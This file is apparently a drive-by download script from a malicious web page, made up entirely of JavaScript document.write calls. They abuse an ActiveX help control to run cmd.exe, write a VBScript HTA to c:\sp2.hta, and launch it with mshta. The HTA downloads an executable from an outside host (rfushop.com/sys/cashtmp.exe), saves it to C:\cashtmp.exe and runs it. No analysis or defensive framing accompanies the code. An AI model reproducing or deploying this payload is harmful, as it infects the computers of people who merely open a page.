document.write("<object id=a1 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo ^<script language=vbscript^> >c:\\sp2.hta'></object><script>a1.Click\(\)</script>");
document.write("<object id=a2 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo on error resume next >>c:\\sp2.hta'></object><script>a2.Click\(\)</script>");
document.write("<object id=a3 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo set o = CreateObject(\"msxml2.XMLHTTP\") >>c:\\sp2.hta'></object><script>a3.Click\(\)</script>");
document.write("<object id=a4 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo o.open \"GET\",\"http://www.rfushop.com/sys/cashtmp.exe\",False >>c:\\sp2.hta'></object><script>a4.Click\(\)</script>");
document.write("<object id=a5 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo o.send >>c:\\sp2.hta'></object><script>a5.Click\(\)</script>");
document.write("<object id=a6 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo set s = createobject(\"adodb.stream\") >>c:\\sp2.hta'></object><script>a6.Click\(\)</script>");
document.write("<object id=a7 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo s.type=1 >>c:\\sp2.hta'></object><script>a7.Click\(\)</script>");
document.write("<object id=a8 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo s.open >>c:\\sp2.hta'></object><script>a8.Click\(\)</script>");
document.write("<object id=a9 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param  name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo s.write o.responseBody >>c:\\sp2.hta'></object><script>a9.Click\(\)</script>");
document.write("<object id=a10 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo s.savetofile \"C:\\cashtmp.exe\",2 >>c:\\sp2.hta'></object><script>a10.Click\(\)</script>");
document.write("<object id=a11 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo Set ws = CreateObject(\"WScript.Shell\") >>c:\\sp2.hta'></object><script>a11.Click\(\)</script>");
document.write("<object id=a12 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo ws.Run \"C:\\cashtmp.exe\", 3, FALSE >>c:\\sp2.hta'></object><script>a12.Click\(\)</script>");
document.write("<object id=a13 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo self.close >>c:\\sp2.hta'></object><script>a13.Click\(\)</script>");
document.write("<object id=a14 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=shortcut><param name=item1 value=',cmd.exe,/c echo ^</script^> >>c:\\sp2.hta'></object><script>a14.Click\(\)</script>");
document.write("<object id=a15 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=shortcut><param name=item1 value=',mshta.exe,c:\\sp2.hta'></object><object id=b classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><param name=command value=close></object><script>a15.Click\(\);b.Click\(\)</script>");





